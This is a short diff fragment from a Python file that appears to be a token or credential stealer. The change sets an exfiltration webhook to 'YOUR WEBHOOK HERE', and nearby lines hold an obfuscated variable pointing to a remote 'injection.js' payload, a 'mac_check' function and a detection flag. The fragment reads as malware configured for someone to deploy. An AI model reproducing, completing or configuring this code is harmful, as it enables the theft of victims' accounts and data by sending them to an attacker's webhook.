@@ -207,7 +207,7 @@ def mac_check():
             pass
 
 
-hook = ""
+hook = "YOUR WEBHOOK HERE"
 inj3c710n_url = "https://raw.githubusercontent.com/SheLuvDx/index/main/injection.js"
 color =  0x00000000
 DETECTED = False
